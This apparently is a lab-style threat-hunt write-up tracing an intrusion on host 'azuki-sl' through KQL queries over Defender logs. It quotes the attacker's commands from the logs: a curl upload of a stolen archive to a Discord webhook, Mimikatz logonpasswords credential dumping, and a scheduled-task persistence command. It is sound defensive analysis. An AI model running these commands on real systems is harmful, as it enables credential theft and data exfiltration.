Looked for successful logons for the `azuki-sl` device. We see that the initial success comes from the `kenji.sato` user at this (`2025-11-19T18:36:18.50392Z`) timestamp
```
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where ActionType == "LogonSuccess"
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/Logonsuccess%20kenji.sato.png">

And the RemoteIP shows the source connection coming from the IPv4 address `88.97.178.12`, which is from outside our network.

## Recon Activity
We run the following command to check for reconnaissance activity
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated > todatetime('2025-11-19T18:36:18.50392Z')
| where FileName in~ ("arp.exe","ipconfig.exe","netsh.exe","getmac.exe","wmic.exe")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/recon%20activity.png">

`ipconfig /all` displays the full TCP/IP configuration for every adapter, including the adapter’s description, MAC address, DHCP status and DNS servers. `arp ‑a` prints the ARP cache; it lists IP addresses, their corresponding MAC addresses and whether each entry is dynamic or static. This lets you see which hosts your machine has recently communicated with on the local LAN.

## Staging Activity
Attackers establish staging locations to organize tools and stolen data.

We look in `DeviceProcessEvents` to see if any directories were created with the `mkdir` or `New-Item` commands, however no logs returned.
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated > datetime(2025-11-19T18:36:18Z)
| where ProcessCommandLine has_any ("mkdir", "New-Item", "md ", "ni ")
| project TimeGenerated, InitiatingProcessAccountName, FolderCreated = ProcessCommandLine;
```

We pivot and look for logs showing the user trying to hide a folder
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated > datetime(2025-11-19T18:36:18Z)
| where ProcessCommandLine has_any ("attrib")
| where ProcessCommandLine has "+h" or ProcessCommandLine has "+s"
| project TimeGenerated, HiddenCommand = ProcessCommandLine;
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/attrib%20log.png">

We find a directory `C:\ProgramData\WindowsCache` the attacker purposefully chose to hide.

`attrib.exe` is a Windows utility that changes the attributes of a file/folder. `+h` adds the `hidden` attribute, so the folder will not appear in File explorer or normal directory listings. `+s` adds the `System` attribute, so the folder is marked as a protected OS folder. 

## File Extension Inclusions
The attacker may also add file extension exclusions to Windows Defender to prevent scanning of malicious files. 
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where RegistryValueName startswith "."
| project TimeGenerated, ActionType, RegistryValueName
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/File%20Extension%20Exclusions.png">

The attacker has made steps to exclude `.exe`, `.ps1` and `.bat` files from Windows Defender.

## Temporary Folder Exclusions
Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools.

We can use this query to reveal the logs in `DeviceRegistryEvents` where the `RegistryKey` included `WindowsDefender\Exclusions`. 
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where RegistryKey has @"Windows Defender\Exclusions"
| project TimeGenerated, ActionType, RegistryValueName, PreviousRegistryValueName, RegistryKey
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/windows%20defender%20exclusions.png">

We see at the bottom, this path `C:\Users\KENJI~1.SAT\AppData\Local\Temp` is excluded from Windows Defender scans.

## Download Utility Abuse
Attackers will use legitimate system utilities to download malware while evading detection.

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where ProcessCommandLine has_any ("http://", "https://")
| where FileName == "certutil.exe"
| project TimeGenerated, AccountDomain, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/certutil%20download%20log.png">
The attacker uses the `certutil` binary. This is a built-in windows command-line utility to manage certificated, but attackers regularly use this to download malicious files

## Scheduled Tasks
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FileName == "schtasks.exe"
| project TimeGenerated, AccountName, ProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/Scheduled%20tasks.png">
We see the attacker has set a scheduled task for persistence.

```
"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f
```

This command creates a scheduled task called `Windows Update Check` (flag 8) that points to a fake `svchost.exe` at `C:\ProgramData\WindowsCache\svchost.exe` (flag 9). As this is located in `C:\ProgramData\WindowsCache`. We know from our previous findings that this is a staging location for the attackers malicious tools.

## Command and Control
We can identify the attackers C2 server by checking the DeviceNetworkEvents for any outbound connections created by the malicious scheduled task we just discovered.

```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= todatetime('2025-11-19T19:07:46.9796512Z')
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessFolderPath has "WindowsCache"
| project TimeGenerated, ActionType, InitiatingProcessFolderPath, RemoteIP, RemoteIPType, RemotePort
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/C2%20IP.png">

The IP of the C2 server is `78.141.196.6` (flag 10) with a destination port at `443` (flag 11).

## Credential Theft Tool

Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.

We can look in `DeviceFileEvents` for logs showing the creation of any files in the `C:\ProgramData\WindowsCache\` folder path.
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FolderPath has_any ("windowscache")
```


<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/extraction%20tool.png">

(Flag 12) The tool being used to extract user information appears to be `mm.exe`, which could be short for `mimikatz`

## Memory Extraction Module

We check in `DeviceProcessEvents` to see if the attacker executed `mm.exe` and with what arguments.
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FolderPath has_any ("mm.exe")
| project TimeGenerated, AccountName, AccountDomain, ProcessCommandLine
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/mm%20execution.png">

The attacker uses the following commands 
```
"mm.exe" privilege::debug sekurlsa::logonpasswords exit
```

`mm.exe` is the executable being called
`privilege::debug` grants the SeDebugPrivilege, which allows Mimikatz to read LSASS memory, dump credentials, and access protected system processes.

(Flag 13) `sekurlsa::logonpasswords` is the module used to command Mimikatz to dump Windows logon passwords if stored in memory, NTLM hashes, kerberos tickets, plaintext creds,  local and domain user sessions.

## Data Staging Archive
Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.

```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FolderPath has_any ("windowscache")
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/exfiltration%20zip%20file.png">

(Flag 14) The attacker created a file called `export-data.zip` and placed it in `C:\ProgramData\WindowsCache\export-data.zip`

## Exfiltration Channel
Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.

We can check all the connections with unique `RemoteUrl's` with the following query.
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime("2025-11-19T19:08:58Z")
| summarize Connections=count() by RemoteUrl
| order by Connections desc
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/remoteurls.png">
There are 47 unique RemoteUrl's. Scrolling through them, I find `discord.com`. This to me seems out of the ordinary since you wouldn't use Discord for many work related purposes.

```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime("2025-11-19T19:08:58Z")
| where RemoteUrl == "discord.com"
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/upload%20to%20discord.png">

The highlighted command is as follows:
```
"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8
```

The attacker used the `curl` command to upload `export-data.zip` to a discord webhook.

(Flag 15) So we confirm that `discord` is the cloud service used to exfiltrate the stolen data.
## Anti-Forensics

Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FileName has_any ("wevtutil.exe")
| project TimeGenerated, AccountName, AccountDomain, ProcessCommandLine
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/clearing%20logs.png">
(Flag 16) The attacker used the `wevutil.exe` tool to clear the `Security, System and Application` logs

## Persistence Account
Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where ProcessCommandLine has_any ("/add")
| project TimeGenerated, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/persistence.png">
(Flag 17) The attacker created the `support` user account and added it to the `Administrators` group using `net.exe`

## Malicious Script
Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where FolderPath has_any ("\\Temp\\", "\\Downloads\\", "windowscache" )
| where FileName endswith ".ps1" or FileName endswith ".bat"
| project TimeGenerated, DeviceName, FileName, FolderPath, FileSize, SHA1
| order by FileSize desc
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/malicious%20script.png">

(Flag 18) The malicious script to execute the attack chain is `wupdate.ps1`

## Lateral Movement
Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated >= datetime(2025-11-19T18:36:18Z)
| where ProcessCommandLine has_any ("cmdkey", "mstsc")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1212" alt="image" src="https://github.com/aktran321/azuki-threat-hunt/blob/main/Threat%20Hunt%20Azuki/lateral%20movement.png">

The attacker uses (Flag 20) `mstsc.exe` to launch Windows Remote Desktop Client to connect to the machine at (Flag 19)`10.1.0.188`.
